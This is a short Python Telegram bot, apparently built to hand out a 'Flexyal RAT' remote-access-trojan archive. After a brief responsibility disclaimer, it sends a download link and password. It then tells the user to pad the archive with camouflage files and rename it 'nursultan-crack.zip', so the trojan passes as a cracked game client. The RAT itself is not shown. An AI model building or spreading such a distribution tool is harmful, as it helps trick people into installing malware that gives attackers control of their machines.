import telebot
from telebot import types
import os

bot = telebot.TeleBot("ВАШ_ТОКЕН")

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_accept = types.KeyboardButton("✅ Да, принимаю ответственность")
    markup.add(btn_accept)
    
    bot.send_message(
        message.chat.id,
        "🔐 *Flexyal RAT Troll Module*\n\n"
        "Вы принимаете на себя всю ответственность за использование этого инструмента "
        "и подтверждаете, что будете использовать его только в законных целях "
        "кибербезопасности с явного разрешения владельца системы.\n\n"
        "Нажмите кнопку ниже для продолжения:",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.text == "✅ Да, принимаю ответственность")
def send_rat(message):
    # Генерация уникального архива
    archive_password = "2025" + str(message.chat.id)[-4:]
    archive_link = "https://example.com/rat_archive.zip"  # Заменить на реальный файлообменник
    
    # Отправка инструкции
    bot.send_message(
        message.chat.id,
        f"📦 *Инструкция по использованию:*\n\n"
        f"1. Скачайте архив: [ССЫЛКА]({archive_link})\n"
        f"2. Пароль: `{archive_password}`\n"
        f"3. Добавьте свои файлы для камуфляжа\n"
        f"4. Переименуйте архив в `nursultan-crack.zip`\n\n"
        f"⚠️ *Важно:* Используйте только в этичных целях!",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

bot.polling()
